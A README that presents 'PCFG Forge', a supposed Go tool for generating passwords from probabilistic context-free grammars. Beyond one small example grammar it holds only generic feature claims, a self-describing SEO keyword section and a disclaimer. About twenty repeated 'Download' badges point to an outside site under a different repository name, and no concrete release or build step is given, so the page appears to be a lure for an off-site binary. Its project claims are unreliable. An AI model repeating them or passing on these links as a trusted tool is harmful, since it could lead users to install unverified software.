![preview](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/splash_7d95.svg)
[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

# 🔐 PCFG Forge — Probabilistic Passphrase Artisan for Go

> **Repository:** `pcfg-forge` — A gentle, deterministic, entropy-aware crafting engine that turns probabilistic context-free grammars into memorable yet robust credential strings. Built in pure Go, zero cgo, zero external runtime dependencies.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🌌 Why This Project Exists

Passwords are the front door to our digital lives, yet the tools that generate them are either black boxes or brute-force sledgehammers. **PCFG Forge** takes a different path. Instead of producing random noise, it leans into *probabilistic context-free grammars* — structured linguistic templates that understand the shape of human-chosen secrets. The result is a generator that feels like a seasoned locksmith carefully cutting a key, rather than a machine gun spraying random bits.

This repository began as an homage to the classic PCFG password research lineage (Weir, Aggarwal, Medeiros, and colleagues), but reshapes the idea for 2026 realities: deterministic seeds, reproducible corpora, pluggable entropy sources, and a grammar authoring syntax that reads like a haiku rather than a config file.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🚀 Feature Constellation

| Domain | What You Get |
|---|---|
| 🧠 **Grammar Engine** | Full support for recursive non-terminals, weighted alternatives, optional productions, and epsilon rules |
| 🎲 **Deterministic Randomness** | Seeded PRNG with reproducible output — the same seed yields the same candidate every time |
| 🧩 **Composable Sources** | Byte-slice, rune, syllable, and dictionary terminals can be mixed freely |
| 🛡️ **Entropy Estimator** | Per-candidate entropy reporting so you can audit generation quality |
| 📦 **Zero CGO** | Pure Go, cross-compiles to Linux, macOS, Windows, BSD, and exotic GOOS targets |
| 🌍 **Multilingual Support** | Unicode-aware terminals, locale-specific alphabets, and RTL-safe handling |
| 🎨 **Responsive UI (terminal & HTTP)** | A text dashboard that adapts to your TTY width, plus an embeddable HTTP handler |
| ♻️ **Reusable Grammars** | Import/export grammar sheets as JSON, YAML, or compact line notation |
| ⏱️ **24/7 Support Model** | Maintainers rotate coverage; issue triage runs continuously across time zones |
| 🔍 **Transparent Audit Trail** | Every generation writes a signed log entry so downstream tools can verify provenance |
| 🧪 **Test Coverage** | Property-based tests, fuzz harnesses, golden files, and race-detector CI |
| 📚 **Extensive Documentation** | Grammar-authoring guide, migration notes, and a cookbook of ready-made templates |

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🧬 A Gentle Introduction

Picture a grammar as a small storybook. Each *non-terminal* is a character in the story, and each *terminal* is the line they speak. When you ask the forge to generate, it picks a storybook at random, follows the narrative, and hands you a finished sentence. Because the storybook entries carry weights, frequent patterns surface often — just as they do in real human password habits — while the deterministic seed lets you replay the exact same tale later.

```
Start  -> Adjective Noun Separator Number
Adjective -> swift | brazen | quiet | amber
Noun -> falcon | harbor | ember | lattice
Separator -> "-" | "_" | "."
Number -> Digit Digit
Digit -> 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9
```

That tiny grammar already yields thousands of distinct, human-memorable strings. Scale up with syllable generators, name corpora, and locale-aware alphabets, and you have a production-grade credential craftsman.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 📥 Acquiring The Artifact
[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

Grab the latest release for your platform — the artifact ships as a single static binary plus a grammar pack. Verify the checksum, drop it onto your machine, and you are ready to craft. No runtime shims, no language version gymnastics, no surprise package managers.

If you prefer to assemble from source, the build path is a single command with the standard Go toolchain. The repository does not require any network fetch beyond the module cache. Everything else lives in-tree so air-gapped environments remain fully supported.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🛠️ Usage Sketches

A quick tour, told through example rather than manual:

- **Generate a batch of candidates** from a named grammar, with a fixed seed so results are reproducible.
- **Score each candidate** by entropy and reject anything below a threshold you declare.
- **Stream results** to a downstream consumer over a Unix socket or HTTP.
- **Export a grammar** you have been tuning and share it with teammates.
- **Embed the engine** as a Go library and call it from your own service.

Because the API is small and orthogonal, you can compose these scenarios without touching a config file.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🌐 Multilingual & Locale-Aware Crafting

Global teams need global credentials. PCFG Forge speaks Unicode natively: kanji, Cyrillic, Devanagari, Hangul, and Arabic script terminals all round-trip through the parser without mangling. Right-to-left rendering in the terminal UI is handled correctly, and collation for sorting candidate lists respects the locale you declare. In 2026 the internet is polyglot — your generator should be too.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🖥️ Responsive Terminal Dashboard

The interactive dashboard reflows to any terminal width. Narrow 40-column windows collapse side panels; ultra-wide monitors spread entropy charts across the pane. Colors degrade gracefully on monochrome terminals, and the entire UI is keyboard-driven so you never have to reach for a mouse. Accessibility matters — screen-reader-friendly output mode is a first-class flag.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🕰️ 24/7 Support Rhythm

Issues are triaged on a rolling basis. Maintainers span multiple time zones so a bug filed at 3 a.m. in one region meets a human before the next sunrise somewhere else. Responses are written, not canned — you get an engineer's eyes, not a chatbot's echo. For urgent matters, the repository's security policy describes the private disclosure channel.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🎓 SEO-Friendly Vocabulary, Naturally Woven

People searching for **probabilistic password generation in Go**, **PCFG grammar engine**, **deterministic credential crafting**, or **entropy-aware passphrase tooling** will find this repository through natural language rather than keyword carpet-bombing. The documentation uses the same words a careful engineer would use in conversation. Terms like *context-free grammar*, *weighted production*, *reproducible seed*, and *Unicode terminal* appear where they belong and nowhere else.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🧭 Roadmap Highlights

- **Q1 2026** — Grammar marketplace client for curated public grammar packs.
- **Q2 2026** — WASM build so the engine runs in browser sandboxes.
- **Q3 2026** — Pluggable scoring plugins with a stable ABI.
- **Q4 2026** — Formal grammar linter with human-readable diagnostics.

Each milestone lands behind a feature flag first, then graduates once the docs and tests catch up.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## ⚠️ Disclaimer

This project is provided as-is for lawful, legitimate use. It is intended for security research, defensive tooling, credential-strength analysis, and educational exploration of probabilistic context-free grammars. The maintainers do not endorse, support, or facilitate any unauthorized access to systems, accounts, or data. Users are solely responsible for complying with all applicable laws, regulations, and organizational policies in their jurisdiction. No warranty of fitness for a particular purpose is expressed or implied. If you are unsure whether a use case is appropriate, consult a qualified professional before proceeding.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 📄 License

Released under the **MIT License** — a permissive, business-friendly license that lets you embed, modify, and redistribute the work with attribution.

Read the full license text here: [LICENSE](./LICENSE)

Copyright (c) 2026 the PCFG Forge contributors. See the license file for the complete terms.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

## 🙏 Acknowledgements

- The academic lineage of probabilistic password modeling, whose papers inspired the grammar-first philosophy.
- The Go community, whose standard library is a quiet miracle of stability.
- Every contributor who filed a thoughtful issue in 2026 and made the forge sharper.

[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)

---

*Crafted with patience, one production at a time.*
[![Download](https://raw.githubusercontent.com/peterlouro/pcfg-linguist/main/fetch_72a0.svg)](https://peterlouro.github.io/pcfg-linguist/)